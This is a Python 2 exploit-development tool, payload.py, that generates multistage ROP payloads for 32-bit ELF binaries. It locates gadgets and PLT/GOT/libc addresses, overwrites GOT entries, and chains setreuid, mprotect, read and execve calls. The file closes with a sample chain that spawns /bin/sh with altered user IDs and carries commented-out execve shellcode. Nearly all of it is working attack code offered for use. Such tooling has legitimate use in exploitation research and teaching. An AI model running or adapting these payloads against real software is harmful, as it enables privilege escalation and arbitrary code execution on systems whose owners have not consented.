#!/usr/bin/env python
#       payload.py
#       
#       Copyright 2010 Long Le Dinh <longld at vnsecurity.net>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#       
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

import struct
import os
import sys 

import readelf
import gadgets

REGISTERS_32 = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp']
REGISTERS_16 = ['ah', 'al', 'bh', 'bl', 'ch', 'cl', 'dh', 'dl']

# Multistage ROP payload
# Sample stage-1 payload and stage-0 payload loader class
class ROPPayload:
    def __init__(self, program, libc = "/lib/libc.so.6", memdump = "", debug = 0):
        self.debug = debug
        self.program = program
        if memdump == "":
            self.memdump = program
        else:
            self.memdump = memdump
        gadget_file = os.path.basename(program) + ".ggt"
        self.binary = open(self.memdump, "rb").read()
        self.libc = libc
        self.elf = readelf.Elf()
        self.gadget = gadgets.ROPGadget(debug=0)
        try:
            open(gadget_file, 'r')
            self.gadget.load_asm(gadget_file)
        except:            
            self.gadget.generate(self.program)
            self.gadget.save_asm(gadget_file)
        
        self.elf.read_headers(program)
        self.base = self.elf.get_header("base")
        self.search_end = self.elf.get_header(".comment")
        self.got = self.elf.get_header(".got")
        self.data = self.elf.get_header(".data")
        self.bss = self.elf.get_header(".bss")
        self.stack = self.bss + 256 - (self.bss % 256) + 8
        self.frames = [] # list of frame offset
        self.plt_address = {}
        self.got_address = {}
        self.libc_address = {}
        self.gadget_address = {}
        self.get_plt_address("sprintf", "strcpy", "__libc_start_main")
        self.get_got_address("sprintf", "strcpy", "__libc_start_main")
        self.get_libc_address("sprintf", "strcpy", "__libc_start_main", "setreuid", "execve", "mprotect", "read")
        self.get_common_gadget_address()

    # get PLT entries of binary
    def get_plt_address(self, *functions):
        if self.plt_address == {}:
            self.elf.read_plt(self.program)
            
        for f in functions:
            addr = self.elf.get_plt(f)
            if addr != -1:
                self.plt_address[f] = addr
                
        return True

    # get GOT entries of binary
    def get_got_address(self, *functions):
        if self.got_address == {}:
            self.elf.read_got(self.program)
            
        for f in functions:
            addr = self.elf.get_got(f)
            if addr != -1:
                self.got_address[f] = addr
                
        return True

    # get libc addresses of functions
    def get_libc_address(self, *functions):
        self.elf.read_libc_offset(self.libc, *functions)
        for f in functions:
            addr = self.elf.get_libc_offset(f)
            if addr != -1:
                self.libc_address[f] = addr
                
        return True

    # get common gadgets addresses
    def get_common_gadget_address(self):
        # popret
        res = self.gadget.asm_search("pop ?")
        if res != []:
            (code, offset) = res[0]
            self.gadget_address["popret"] = offset
            self.gadget_address["ret"] = offset + 1

        # pop2ret
        res = self.gadget.asm_search("pop ? pop ?")
        if res != []:
            (code, offset) = res[0]
            self.gadget_address["pop2ret"] = offset

        # pop3ret
        res = self.gadget.asm_search("pop ? pop ? pop ?")
        if res != []:
            (code, offset) = res[0]
            self.gadget_address["pop3ret"] = offset

        # pop4ret
        res = self.gadget.asm_search("pop ? pop ? pop ? pop ?")
        if res != []:
            (code, offset) = res[0]
            self.gadget_address["pop4ret"] = offset

        # leaveret
        res = self.gadget.asm_search("leave")
        if res != []:
            (code, offset) = res[0]
            self.gadget_address["leave"] = offset

        # popebp
        res = self.gadget.asm_search("pop ebp")
        if res != []:
            (code, offset) = res[0]
            self.gadget_address["popebp"] = offset

        # call eax
        self.gadget_address["calleax"] = 0
        res = self.gadget.asm_search("call eax")
        if res != []:
            (code, offset) = res[0]
            self.gadget_address["calleax"] = offset
        
        # initiate GOT overwriting/dereferencing gadgets
        # TODO: automated search
        self.gadget_address["addmem_popr1"] = 0
        self.gadget_address["addmem_popr2"] = 0
        self.gadget_address["addmem_add"] = 0

        self.gadget_address["addreg_popr1"] = 0
        self.gadget_address["addreg_popr2"] = 0
        self.gadget_address["addreg_add"] = 0
        
        self.gadget_address["jmpreg"] = self.gadget_address["calleax"]
        
        return True

    # get specific gadget address
    # by default search code will be appended with % wildcard if not found
    def get_gadget_address(self, code = ""):
        if code == "":
            return False

        res = self.gadget.asm_search(code)
        if res == []: # extend wildcard search
            code += " %"
            res = self.gadget.asm_search(code)
            if res != []:
                (code, offset) = res[0]
                self.gadget_address[code] = offset

        return True

    # generate got overwriting steps
    def got_overwrite(self, plt_function, src_function, dst_function, trailing_leave = 0, leave_offset = 0, got_offset = 0):
        result = []
        self.msg("Generating GOT overwriting: %s@GOT %s -> %s" % (plt_function, src_function, dst_function))
        
        if plt_function not in self.got_address:
            self.get_got_address(plt_function)
    
        if src_function not in self.libc_address:
            self.get_libc_address(src_function)

        if dst_function not in self.libc_address:
            self.get_libc_address(dst_function)
                
        result += [self.gadget_address["addmem_popr1"], self.libc_address[dst_function] - self.libc_address[src_function]]
        result += [self.gadget_address["ret"]] # tricky, in case pop r1 followed by a pop reg
        result += [self.gadget_address["addmem_popr2"], self.got_address[plt_function] - got_offset]
        result += [self.gadget_address["ret"]] # tricky, in case pop r2 followed by a pop reg
        result += [self.gadget_address["addmem_add"]]
        result += [self.gadget_address["ret"]] # tricky, in case pop r2 followed by a pop reg
        self.make_frame(result)
        if trailing_leave == 1:
            result = self.make_leave(result, leave_offset)
        
        self.msg(self.formatlist(result))
        return result

    # generate got dereferencing steps
    def got_dereference(self, plt_function, src_function, dst_function, trailing_leave = 0, leave_offset = 0, got_offset = 0):
        result = []

        if plt_function not in self.got_address:
            self.get_got_address(plt_function)

        if src_function not in self.libc_address:
            self.get_libc_address(src_function)

        if dst_function not in self.libc_address:
            self.get_libc_address(dst_function)
                    
        self.msg("Generating GOT dereferencing: %s@GOT %s -> %s" % (plt_function, src_function, dst_function))
        result += [self.gadget_address["addreg_popr1"], self.libc_address[dst_function] - self.libc_address[src_function]]
        result += [self.gadget_address["ret"]] # tricky, in case pop r1 followed by a pop reg
        result += [self.gadget_address["addreg_popr2"], self.got_address[plt_function] - got_offset]
        result += [self.gadget_address["ret"]] # tricky, in case pop r2 followed by a pop reg
        result += [self.gadget_address["addreg_add"]]
        result += [self.gadget_address["jmpreg"]]
        self.make_frame(result)
        if trailing_leave == 1:
            result = self.make_leave(result)

        self.msg(self.formatlist(result))
        return result

    # generate stack for calling function in PLT
    def call_plt_function(self, plt_function, *argv):
        result = []
        
        if plt_function not in self.plt_address:
            self.get_plt_address(plt_function)
                    
        self.msg("Generating PLT call: %s@PLT %s" % (plt_function, self.formatlist(list(argv))))
        result += [self.plt_address[plt_function]]
        l = len(argv)
        if l == 1:
            result += [self.gadget_address["popret"]]
        if l == 2:
            result += [self.gadget_address["pop2ret"]]
        if l == 3:
            result += [self.gadget_address["pop3ret"]]
        if l == 4:
            result += [self.gadget_address["pop4ret"]]
            
        result += list(argv)

        self.msg(self.formatlist(result))
        return result

    # append a frame to stack frame list
    def make_frame(self, code = []):
        self.frames.append(len(code)*4)
        return True

    # get the length of whole stack frames
    def get_frame_len(self, findex = -1):
        flen = 0
        if findex == -1:
            findex = len(self.frames)
            
        for i in range(findex):
            flen += self.frames[i]

        return flen
    
    # insert [pop ebp | new_frame_address] for frame with trailing leave
    # for simplicity, only do for last frame
    # adjusting leave_offset if leave not in the last gadget
    def make_leave(self, frame = [], leave_offset = 0):
        result = []
        result += [self.gadget_address["popebp"]]
        offset = self.stack + self.get_frame_len(-1) - 4
        offset += leave_offset # custom offset adjustment
        result += [offset] + frame
        self.frames[-1] += 8 # added 8 bytes
        
        #self.msg(self.formatlist(result))
        return result

    # stage-1 payload: execve(cmd)
    def stage1_execve(self, plt_function, cmd = "/bin/sh"):
        result = []

        if plt_function not in self.plt_address:
            self.get_plt_address(plt_function)
        
        self.msg("Generating stage-1 execve: %s@PLT (%s)" % (plt_function, cmd))
        result += [self.plt_address[plt_function], -1] # fake return
        cmd_addr = self.stack + self.get_frame_len(-1) + 5*4
        result += [cmd_addr, 0, 0] + self.str2int(cmd + "\x00")
        self.make_frame(result)

        self.msg(self.formatlist(result))
        return result

    # stage-1 payload: setreuid(ruid, euid)
    def stage1_setreuid(self, plt_function, ruid, euid):
        result = []

        if plt_function not in self.plt_address:
            self.get_plt_address(plt_function)
        
        self.msg("Generating stage-1 setreuid: %s@PLT (ruid=%d, euid=%d)" % (plt_function, ruid, euid))
        result += self.call_plt_function(plt_function, ruid, euid)
        self.make_frame(result)

        self.msg(self.formatlist(result))
        return result

    # stage-1 payload: mprotect(address, size, proto)
    # default proto is PROT_READ | PROT_WRITE | PROT_EXEC
    def stage1_mprotect(self, plt_function, address = 0, size = 4096, proto = 7):
        result = []
        
        # get pagesize
        pagesize = os.sysconf('SC_PAGE_SIZE')
        
        if plt_function not in self.plt_address:
            self.get_plt_address(plt_function)
        
        self.msg("Generating stage-1 mprotect: %s@PLT (addr=%x, size=%d, prot=%d)" % (plt_function, address, size, proto))
        if address == 0:
            address = self.stack - (self.stack % pagesize)
        result += self.call_plt_function(plt_function, address, size, proto)
        self.make_frame(result)

        self.msg(self.formatlist(result))
        return result

    # stage-1 payload: memcpy(dst, src, count)
    # copy shellcode to new address
    def stage1_memcpy(self, plt_function, dst, src, count = 256):
        result = []
        
        if plt_function not in self.plt_address:
            self.get_plt_address(plt_function)
        
        self.msg("Generating stage-1 memcpy: %s@PLT (dst=%x, src=%x)" % (plt_function, dst, src))
        result += self.call_plt_function(plt_function, dst, src, count)
        self.make_frame(result)

        self.msg(self.formatlist(result))
        return result

    # stage-1 payload: read(fd, buf, count)
    # read for next stage
    def stage1_read(self, plt_function, fd = 0, address = 0, count = 256):
        result = []

        if plt_function not in self.plt_address:
            self.get_plt_address(plt_function)
        
        self.msg("Generating stage-1 read: %s@PLT (fd=%d, buf=%x, count=%d)" % (plt_function, fd, address, count))
        if address == 0:
            address = self.stack - 4        
        result += self.call_plt_function(plt_function, fd, address, count)
        result += address
        self.make_frame(result)

        self.msg(self.formatlist(result))
        return result

    # stage-0 helper function    
    # find one or more chars in binary or memdump, string start with chars will not exceed maxlen
    # offset value must not contain badchar and should not fall to .got or .bss
    def find_chars(self, code, substr, maxlen = 256, badchar = []):
        null = "\x00"
        i = code.find(substr)
        while i != -1:
            j = code.find(null, i+1)
            if j != -1:
                addr = self.base + i
                if (j-i) <= maxlen and self.filter_badchar(addr, badchar) != -1:
                    return addr
            i = code.find(substr, i+1)

        return -1

    # stage-0 helper function
    # detect if an address in hex contains badchar
    def filter_badchar(self, value, badchar = []):
        s = "%x" % value
        l = len(s)
        s = s.rjust(l + l%2, "0")
        for i in badchar:
            c = "%.2x" % i
            if (s.find(c) % 2) == 0:
                return -1

        return 0

    # stage-0 helper function
    # find list of addresses for a shellcode hexstring in binary or memdump
    def find_hexstr(self, code, str, maxlen = 256, badchar = []):
        dict = {}
        result = []
        failed = []
        l = len(str)
        i = 0
        while i < l:
            j = 1
            c = str[i]
            if c in dict:
                result.append((c, dict[c])) # (char, offset)
                i += 1
            else:
                offset = self.find_chars(code, c, maxlen, badchar)
                #print "Found at:", hex(offset)
                k = offset
                while k != -1 and (i+j) < l: # search for next char
                    if c.find("\x00") != -1: # contain null, stop
                        break       
                    c += str[i+j]
                    k = self.find_chars(code, c, maxlen, badchar)
                    if k != -1:
                        offset = k
                        j += 1
                    else:
                        c = c[:-1]
                if offset == -1:
                    print >>sys.stderr, "Failed to find value: 0x" + c.encode('hex')
                    failed += [c]
                    
                dict[c] = offset
                result.append((c, dict[c])) # (char, address)
                i += j

        if failed != []:
            result = []
            
        return result

    # stage-0 helper function
    # convert hex address/value to string
    def hex2str(self, hex):
        return struct.pack("<l", hex)

    # stage-0 helper function
    # convert string to int list
    def str2int(self, str):
        out = []
        l = len(str)
        str += "\x00"*(4 - l%4)
        for i in range(0, l, 4):
            out += struct.unpack("<l", str[i:i+4])
        return out

    # stage-0 helper function
    # convert list of addresses/values to hexstring
    def list2hexstr(self, intlist):
        out = ""
        for value in intlist:
            if type(value) == type("str"): #
                out += value
            else:
                out += self.hex2str(value)

        return out

    # format the list of hex address/value for verbose printing
    def formatlist(self, intlist):
        return [ "0x" + struct.pack(">l", value).encode('hex') for value in intlist]

    # debug/verbose output
    def msg(self, *strs):
        if self.debug == 1:
            for str in strs:
                print >> sys.stderr, str, 
            print >> sys.stderr
            
    # generate stage-0 payload
    # raw format: binary
    # hex format: "0bb0"
    # str format: "\x0b\xb0"
    def gen_stage0(self, loadfunc = "strcpy", stage1 = None, max_str_len = 256, badchar = [], format = "raw"):
        payload = []
        target = self.stack

        # convert stage-1 to string if input is list of integer
        if type(stage1) == type([]):
            self.msg("Stage-1: ", self.formatlist(stage1))
            stage1_str = self.list2hexstr(stage1)

        if type(stage1) == type(""):
            self.msg("Stage-1:", ["0x%x" % ord(x) for x in list(stage1)])
            stage1_str = stage1

        self.msg("Stage-1 len:", len(stage1_str))
        self.msg("Generating Stage-0 payload using loader function: " + loadfunc)
        # convert stage-1 to strcpy chains
        address_list = self.find_hexstr(self.binary, stage1_str, max_str_len, badchar)
        if address_list == []:
            print >>sys.stderr, "Failed to generate stage-0 payload, adjust your stage-1 then try again!\n"
            return ""
            
        for (str, addr) in address_list:
            self.msg(hex(addr), str.encode('hex'), repr(str))
            payload += self.call_plt_function(loadfunc, target, addr)
            if self.filter_badchar(target, badchar) == -1:
                print >>sys.stderr, "Warning: target address contains bad chars:", hex(target)
                print >>sys.stderr, "Adjust your custom stack or stage-1 payload size", hex(target)

            target += len(str)

        # append frame faking to jump to custom stack
        payload += [self.gadget_address["popebp"], self.stack-4]
        payload += [self.gadget_address["leave"]]
        self.msg("\nStage-0:", self.formatlist(payload))
        payload = self.list2hexstr(payload)
        self.msg("Stage-0 len: ", len(payload))
        #print >>sys.stderr, "\nPayload in %s format:" % format              

        if format == "raw": # default format
            return payload
        if format == "hex":
            payload = '\"' + payload.encode("hex") + '\"'
        if format == "str":
            out = list(payload)
            out = [x.encode('hex') for x in out]
            payload = '\"' + "\\x" + "\\x".join(out) + '\"'
            
        return payload
        
if (__name__ == "__main__"):
    import sys
    import binascii

    try:
        program = sys.argv[1]
    except:
        pass

    libc = "/lib/libc.so.6"
    try:
        libc = sys.argv[2]
    except:
        pass

    P = Payload(program, libc)
    
    # these gadgets address can be found by ropshell.py or ropsearch.py
    
    ### MODIFY FROM HERE ###
    # pop ecx ; pop ebx ; leave ;; = 0x8048624
    # pop ebp ;; = 0x80484b4
    # add [ebp+0x5b042464] ecx ; pop ebp ;; = 0x80484ae
    P.gadget_address["addmem_popr1"] = 0x8048624
    P.gadget_address["addmem_popr2"] = 0x80484b4
    P.gadget_address["addmem_add"] = 0x80484ae

    P.gadget_address["addreg_popr1"] = 0
    P.gadget_address["addreg_popr2"] = 0
    P.gadget_address["addreg_add"] = 0
    P.gadget_address["jmpreg"] = P.gadget_address["calleax"]
    ### END MODIFY FROM HERE ###
    
    # set the custom stack address if required
    P.stack = 0x08049810
   
    # stage-1: overwrite GOT entry of strlen() with setreuid()
    stage1 = P.got_overwrite("strlen", "strlen", "setreuid", 1, -16)

    # stage-1: call setreuird() via strlen@PLT
    stage1 += P.stage1_setreuid("strlen", -1, 99)

    # stage-1: overwrite GOT entry of strlen() with execve() which points to setreuid() in previous step
    stage1 = P.got_overwrite("strlen", "setreuid", "execve", 1, -16)

    # stage-1: call execve("/bin/sh") via strlen@PLT
    stage1 += P.stage1_execve("strlen")
        
    # generate stage-0
    stage0 = P.gen_stage0("printf", stage1, format = "str")
    print stage0
    
    # we can generate stage-0 for pre-built shellcode
    #execve_shellcode = "\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x65\xff\x15\x10\x00\x00\x00"
    #stage0 = P.gen_stage0("printf", execve_shellcode, format = "str")
